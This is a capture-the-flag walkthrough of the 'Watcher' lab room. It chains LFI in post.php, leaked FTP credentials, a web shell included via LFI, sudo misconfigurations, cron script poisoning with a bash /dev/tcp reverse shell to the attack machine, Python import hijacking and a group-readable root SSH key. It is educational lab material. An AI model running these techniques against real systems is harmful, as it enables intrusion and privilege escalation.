# Watcher CTF — Full Walkthrough

**Room:** Watcher | **Difficulty:** Medium | **Flags:** 7

| Detail | Value |
|--------|-------|
| Target IP | `10.48.145.200` |
| Attack Machine | Kali Linux |
| Attack IP | `192.168.192.149` |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | `robots.txt` information disclosure |
| 02 | FTP file download |
| 03 | LFI via `post.php` |
| 04 | Sudo misconfiguration (`www-data` → `toby`) |
| 05 | Cron job poisoning (`toby` → `mat`) |
| 06 | Python import hijacking (`mat` → `will`) |
| 07 | Root SSH key extraction from `/opt/backups/` |

---

## Phase 1: Reconnaissance & Flag 1

```bash
# Check robots.txt — flag disclosed
curl -s http://10.48.145.200/robots.txt
```

**Flag 01** was directly exposed in `robots.txt`.

---

## Phase 2: LFI & FTP Access

### Local File Inclusion

The `post.php?post=` parameter is vulnerable to LFI:

```bash
# Read the secret credentials file via LFI
curl -s "http://10.48.145.200/post.php?post=secret_file_do_not_read.txt"
```

**FTP Credentials found:** `ftpuser:givemefiles777`

### Flag 2 — FTP Download

```bash
ftp 10.48.145.200
# Login: ftpuser / givemefiles777
# Downloaded: flag_2.txt
```

### Flag 3 — LFI

```bash
curl -s "http://10.48.145.200/post.php?post=more_secrets_a9f10a/flag_3.txt"
```

---

## Phase 3: Remote Code Execution

Uploaded a PHP web shell via FTP, then triggered it through LFI:

```bash
# Upload shell.php via FTP to /home/ftpuser/ftp/files/

# Execute commands by including the shell via LFI
curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&cmd=id"
```

---

## Phase 4: Privilege Escalation (www-data → toby)

```bash
sudo -l
```

**Result:** `www-data` can run ANY command as user `toby` without a password.

```bash
sudo -u toby cat /home/toby/flag_4.txt
```

---

## Phase 5: Privilege Escalation (toby → mat)

Found a cron job running as `mat`:

```
* * * * * mat cd /home/toby/jobs && bash cow.sh
```

Overwrote `cow.sh` with a reverse shell payload and caught the shell:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/192.168.192.149/4445 0>&1' > /home/toby/jobs/cow.sh
```

---

## Phase 6: Privilege Escalation (mat → will)

```bash
sudo -l
```

**Result:** `mat` can run `/usr/bin/python3 /home/mat/scripts/will_script.py` as `will`.

`will_script.py` imports `cmd` module. Created a malicious `cmd.py` in the same directory:

```python
import os
os.system("/bin/bash")
```

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py
```

---

## Phase 7: Privilege Escalation (will → root)

User `will` is a member of the `adm` group, granting access to `/opt/backups/`:

```bash
ls -la /opt/backups/
cat /opt/backups/key.b64  # Root SSH key (base64 encoded)
```

Decoded the key, set permissions, and logged in as root:

```bash
chmod 600 key
ssh -i key root@10.48.145.200
```

**Root shell obtained. Flag 07 captured.**

---

## Vulnerability Chain

1. **Information disclosure** — `robots.txt`
2. **Local File Inclusion** — `post.php`
3. **Credential leak** — Hardcoded FTP credentials
4. **Unrestricted file upload** — FTP writable directory
5. **RCE via LFI** — Including an uploaded web shell
6. **Sudo misconfiguration** — Full sudo rights for `www-data`
7. **Cron job poisoning** — Writable script owned by other user
8. **Python import hijacking** — Writable library files
9. **Insecure permissions** — Group-readable root SSH key

## Key Takeaways

- **Chain multiple low-severity issues** for full compromise
- **Always enumerate** — check sudo, crontabs, and group memberships
- **Python import order** can be exploited when directories are writable
